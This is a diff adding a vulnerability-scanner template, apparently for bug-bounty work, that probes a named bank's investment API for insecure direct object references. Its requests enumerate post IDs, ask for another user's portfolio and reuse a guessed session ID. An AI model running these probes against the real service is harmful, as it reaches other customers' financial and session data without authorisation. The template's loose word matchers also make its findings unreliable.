@@ -1,0 +1,55 @@
+id: tinkoff-idor
+
+info:
+  name: Tinkoff - IDOR Vulnerabilities
+  author: bugbounty
+  severity: high
+  description: Insecure Direct Object Reference in posts, portfolios, and user data
+  tags: idor,tinkoff
+
+http:
+  - raw:
+      - |
+        GET /api/invest-gw/social/v1/post?id=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/invest-gw/social/v1/post?id=2 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/invest-gw/social/v1/post?id=99999 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/invest/portfolio/instruments/v2?tickers=USER1_PORTFOLIO HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/common/v1/session_info?sessionid=00000000-0000-0000-0000-000000000001 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "post"
+          - "portfolio"
+          - "user"
+          - "session"
+          - "data"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "not found"
+          - "unauthorized"
+        condition: or
+        negative: true
